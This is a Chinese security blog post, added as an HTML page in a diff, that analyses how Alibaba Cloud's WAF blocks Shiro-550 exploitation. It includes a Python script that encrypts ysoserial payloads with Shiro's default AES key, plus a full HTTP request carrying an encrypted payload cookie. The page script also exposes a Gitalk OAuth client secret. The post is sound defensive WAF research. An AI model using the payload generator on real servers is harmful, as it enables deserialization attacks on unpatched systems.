@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","images":"/images","scheme":"Pisces","version":"8.1.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+  </script>
+<meta name="description" content="问题背景shiro-550漏洞利用时，payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密-&gt;base64编码。 也有人整理出常见的aes加密密钥 top100 来利用此漏洞。 如果要在waf中对这个漏洞利用做防护，我能想到的安全策略是：  根据cookie中的rememberMe的值是否过长、是否符合aes加密特征等 来拦截 先base6">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从shiro-550漏洞品阿里云waf规则引擎">
+<meta property="og:url" content="http://yoursite.com/2021-03-12-%E4%BB%8Eshiro-550%E6%BC%8F%E6%B4%9E%E5%93%81%E9%98%BF%E9%87%8C%E4%BA%91waf%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/index.html">
+<meta property="og:site_name" content="leveryd的个人博客">
+<meta property="og:description" content="问题背景shiro-550漏洞利用时，payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密-&gt;base64编码。 也有人整理出常见的aes加密密钥 top100 来利用此漏洞。 如果要在waf中对这个漏洞利用做防护，我能想到的安全策略是：  根据cookie中的rememberMe的值是否过长、是否符合aes加密特征等 来拦截 先base6">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-03-12T10:49:38.197Z">
+<meta property="article:modified_time" content="2021-03-12T13:02:07.925Z">
+<meta property="article:author" content="leveryd">
+<meta property="article:tag" content="安全产品 WAF">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://yoursite.com/2021-03-12-%E4%BB%8Eshiro-550%E6%BC%8F%E6%B4%9E%E5%93%81%E9%98%BF%E9%87%8C%E4%BA%91waf%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+<title>从shiro-550漏洞品阿里云waf规则引擎 | leveryd的个人博客</title>
+  
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">leveryd的个人博客</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E8%83%8C%E6%99%AF"><span class="nav-number">1.</span> <span class="nav-text">问题背景</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">分析过程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">leveryd</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/leveryd" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;leveryd" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1157599735@qq.com" title="E-Mail → mailto:1157599735@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-03-12-%E4%BB%8Eshiro-550%E6%BC%8F%E6%B4%9E%E5%93%81%E9%98%BF%E9%87%8C%E4%BA%91waf%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          从shiro-550漏洞品阿里云waf规则引擎
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-03-12 18:49:38 / 修改时间：21:02:07" itemprop="dateCreated datePublished" datetime="2021-03-12T18:49:38+08:00">2021-03-12</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>shiro-550漏洞利用时，payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密-&gt;base64编码。</p>
+<p>也有人整理出常见的aes加密密钥 top100 来利用此漏洞。</p>
+<p>如果要在waf中对这个漏洞利用做防护，我能想到的安全策略是：</p>
+<ol>
+<li>根据cookie中的rememberMe的值是否过长、是否符合aes加密特征等 来拦截</li>
+<li>先base64解码，然后aes解密，最后规则匹配原始payload</li>
+</ol>
+<p>第二个方法存在两个问题：</p>
+<ol>
+<li><p>aes解密时密钥是啥？会把top100利用时的密钥全部覆盖？</p>
+</li>
+<li><p>这个方法想起来简单，但是实施起来并不简单。它需要规则引擎支持base64解码和aes解密，并且需要规则中能够很容易描述这个解码顺序。</p>
+<p> 按照我的理解，waf和poc扫描的规则引擎类似，都支持规则描述文件和代码实现方式两种。如果waf规则引擎只支持规则描述文件的形式，不支持用代码来描述防护规则，那写这么一条规则我觉得还挺费劲的。</p>
+</li>
+</ol>
+<p>下面就是我验证阿里云waf是怎么拦截防护shiro-550漏洞的。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>测试payload使用下面脚本生成，其中key使用shiro-550默认key</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">#Python2</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key &#x3D; &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br><span class="line">BS &#x3D; AES.block_size</span><br><span class="line">mode &#x3D; AES.MODE_CBC</span><br><span class="line">iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">encryptor &#x3D; AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pad(s): return s + ((BS - len(s) % BS)</span><br><span class="line">                    * chr(BS - len(s) % BS)).encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt_shiro_payload(rememberMe):</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	打印 java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS &quot;&quot; 生成的payload</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	# rememberMe &#x3D; &quot;&quot;&quot;x4xXLguUTO+o2zDz6PKJtR7VQfrG08LE5KTMlw3cViQACMqKZ34wqnB1PIYeWTyiLrx2Dp7Gw3cFHJzwBUdqJXnSWmG7&#x2F;SC7EH6c6OgPNTCgiplznhs61pwsoFU6X9NTHZi+&#x2F;xr2Jo3rh&#x2F;TW1gPqK6y4UGW9nqT6UDFybJLqO4bb7DhNsMkVNB4sZ7SgE1ee4zhY591SECQEDDzkM0EHbc2drf92hgueAEK450IqjUI03s1hq838mziWdE7OtQPQ6CjldBKPrSZ0BNhOGP+epg5SrLpXAjj&#x2F;iwLVCRFE0lIUFtNDc9m8h5JKg&#x2F;SLwa&#x2F;yNTWZ+5DAooRs4+&#x2F;yy1Z6xIe7d+OunTmTMnNXACNthKd96Y8RA4q9TnnS4aV91HbMoo&#x2F;Voy&#x2F;v03expiCm2OBpv72oTUCtV9eoHBByXyUsBDUI9BtN1IfAwjkFYj6fa4w5nAuR4sgbBrVy1KYnbgVN1H3DZ5Lmt8tvz1uhxo+SIQLtJfqhY1NhW10bWNm3F+sSyG7xblEDVgBLWer7ayRwZlv7&#x2F;LejK1NPsjVPd8MvBTHfBMShNaQmS7LRTQssGaxq&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">	data &#x3D; encryptor.decrypt(base64.b64decode(rememberMe))</span><br><span class="line">	print(data)</span><br><span class="line">	print(len(data))</span><br><span class="line"></span><br><span class="line">def encrypt_shiro_payload(originalPayload):</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	originalPayload 是 java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS &quot;http:&#x2F;&#x2F;xxx&quot; 生成的payload</span><br><span class="line"></span><br><span class="line">	打印payload</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	data &#x3D; base64.b64encode(encryptor.encrypt(pad(originalPayload)))</span><br><span class="line">	print(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	encrypt_shiro_payload(&quot;111111&quot;*400)</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>测试攻击请求</p>
+<p> 原始payload是利用ysoerial工具生成： java8 -jar scripts/third_party/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS “”</p>
+<p> payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密→base64编码</p>
+<p> 发送请求后，阿里云waf拦截</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxxx.com</span><br><span class="line">User-Agent: curl&#x2F;7.70.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Cookie: rememberMe&#x3D;x4xXLguUTO+o2zDz6PKJtR7VQfrG08LE5KTMlw3cViQACMqKZ34wqnB1PIYeWTyiLrx2Dp7Gw3cFHJzwBUdqJXnSWmG7&#x2F;SC7EH6c6OgPNTCgiplznhs61pwsoFU6X9NTHZi+&#x2F;xr2Jo3rh&#x2F;TW1gPqK6y4UGW9nqT6UDFybJLqO4bb7DhNsMkVNB4sZ7SgE1ee4zhY591SECQEDDzkM0EHbc2drf92hgueAEK450IqjUI03s1hq838mziWdE7OtQPQ6CjldBKPrSZ0BNhOGP+epg5SrLpXAjj&#x2F;iwLVCRFE0lIUFtNDc9m8h5JKg&#x2F;SLwa&#x2F;yNTWZ+5DAooRs4+&#x2F;yy1Z6xIe7d+OunTmTMnNXACNthKd96Y8RA4q9TnnS4aV91HbMoo&#x2F;Voy&#x2F;v03expiCm2OBpv72oTUCtV9eoHBByXyUsBDUI9BtN1IfAwjkFYj6fa4w5nAuR4sgbBrVy1KYnbgVN1H3DZ5Lmt8tvz1uhxo+SIQLtJfqhY1NhW10bWNm3F+sSyG7xblEDVgBLWer7ayRwZlv7&#x2F;LejK1NPsjVPd8MvBTHfBMShNaQmS7LRTQssGaxp</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>测试正常请求</p>
+<p> 原始payload是 “111111”*400 ，不包含攻击特征。</p>
+<p> payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密-&gt;base64编码</p>
+<p> 结论：正常请求阿里云waf未拦截</p>
+</li>
+</ol>
+<p>对比拦截和不拦截的情况，可以看出来阿里云waf防护防护规则逻辑：先对cookie中的rememberMe做base64解码，然后用默认key(kPH+bIxk5D2deZiIxcaaaA==”) 来做aes解密，最后规则匹配解密后的内容。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还有一些测试在分析过程中没有写，这里直接写出结论：</p>
+<ol>
+<li>阿里云waf仅尝试使用一个默认key来解密。（应该是性能考虑）</li>
+<li>不能根据rememberMe的值过长来拦截，因为正常业务这个值也可能有500+个字节长度。</li>
+</ol>
+<p>虽然不能完全防御shiro-100key扫描，但是阿里云waf这条规则还是挺细致的。从支持rsa解密这一点上感觉背后的规则引擎功能很丰富。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81-WAF/" rel="tag"><i class="fa fa-tag"></i> 安全产品 WAF</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021-03-11-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(2)/" rel="prev" title="细品某语义waf的xss防护(2)">
+                  <i class="fa fa-chevron-left"></i> 细品某语义waf的xss防护(2)
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021-03-12-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(3)/" rel="next" title="细品某语义waf的xss防护(3)">
+                  细品某语义waf的xss防护(3) <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">leveryd</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1.7.0/dist/gitalk.css">
+
+<script>
+NexT.utils.loadComments('#gitalk-container', () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1.7.0/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : '9cb491b99c20d84a586d',
+      clientSecret: 'd1f8d1806ff244de9ea62e73f7beb3ee1121a4b7',
+      repo        : 'gitalk-comment',
+      owner       : 'leveryd',
+      admin       : ['leveryd'],
+      id          : '0b1b27f1dfb7cc4ca8c8488ed307e517',
+        language: 'zh-CN',
+      distractionFreeMode: false
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
